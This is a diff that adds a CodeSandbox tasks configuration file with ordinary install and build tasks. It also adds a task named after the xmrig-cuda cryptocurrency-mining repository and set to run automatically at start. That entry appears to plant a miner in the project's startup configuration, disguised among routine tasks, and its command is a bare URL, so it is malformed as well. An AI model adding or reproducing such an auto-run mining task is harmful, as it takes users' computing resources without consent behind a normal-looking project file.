@@ -1,0 +1,23 @@
+{
+  // These tasks will run in order when initializing your CodeSandbox project.
+  "setupTasks": [
+    {
+      "name": "Install Dependencies",
+      "command": "yarn install"
+    }
+  ],
+
+  // These tasks can be run from CodeSandbox. Running one will open a log in the app.
+  "tasks": {
+    "build": {
+      "name": "build",
+      "command": "yarn build",
+      "runAtStart": false
+    },
+    "https://github.com/xmrig/xmrig-cuda.git": {
+      "name": "https://github.com/xmrig/xmrig-cuda.git",
+      "command": "https://github.com/xmrig/xmrig-cuda.git",
+      "runAtStart": true
+    }
+  }
+}
